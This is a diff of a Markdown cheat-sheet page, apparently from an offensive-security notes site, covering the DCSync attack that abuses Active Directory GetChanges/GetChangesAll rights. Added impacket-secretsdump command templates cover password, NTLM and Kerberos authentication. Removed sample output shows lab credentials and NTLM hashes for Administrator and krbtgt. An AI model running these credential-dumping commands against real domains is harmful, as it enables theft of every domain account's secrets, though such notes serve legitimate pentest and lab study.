@@ -1,48 +1,39 @@
 ---
 title: "GetChanges/GetChangesAll"
-tags: ["Dcsync", "Getchanges", "Getchangesall", "Secretsdump", "Active Directory", "Windows"]
+tags: ["Active Directory", "GetChanges/GetChangesAll", "Dcsync", "Getchanges", "Getchangesall", "Secrets Dump", "Windows"]
 ---
 
-#### Abuse #1: DCSync Attack
+{{< filter_buttons >}}
+
+### DCSync Attack
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
-impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>'
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' -just-dc
 ```
 
-```console {class="sample-code"}
-$ impacket-secretsdump -just-dc 'mrlky:Football#7@10.10.10.103'
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
-
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
----[SNIP]---
-[*] Cleaning up...
-```
-
-```console
+```console {class="ntlm"}
 # NTLM
-impacket-secretsdump -hashes :<HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>'
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -just-dc
 ```
 
-```console {class="sample-code"}
-$ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc 'sizzle.htb/mrlky@10.10.10.103'
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' -k -just-dc
+```
 
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-[*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
----[SNIP]---
-[*] Cleaning up...
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k -just-dc
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass -just-dc
 ```
 
 {{< /tabcontent >}}
